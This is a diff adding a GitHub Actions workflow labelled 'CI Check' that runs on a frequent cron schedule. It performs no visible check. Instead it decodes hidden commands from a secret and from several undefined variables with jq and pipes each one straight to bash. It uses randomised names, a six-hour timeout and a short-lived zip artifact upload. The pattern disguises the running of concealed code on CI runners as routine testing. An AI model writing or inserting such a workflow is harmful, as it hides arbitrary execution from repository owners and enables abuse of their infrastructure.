@@ -1,0 +1,34 @@
+name: CI Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '26 3,9,15,21 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  validate:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run task
+        env:
+          raq32804: ${{ secrets.raq32804 }}
+        run: |
+          printf '%s' "$raq32804" | jq -r .ttf16665 | /bin/bash
+          echo $ru79 | jq -r .z2 | /bin/bash
+          printf '%s' "$kezom90" | jq -r .gp711 | /bin/bash
+          printf '%s' "$wciq090" | jq -r .bqncv6917 | /bin/bash
+          printf '%s' "$ctf24" | jq -r .wvfh3060 | /bin/bash
+          printf '%s' "$bv5" | jq -r .iok9 | /bin/bash
+
+      - name: Store output
+        uses: actions/upload-artifact@v4
+        with:
+          name: TyiFPQF7
+          path: "*.zip"
+          retention-days: 1
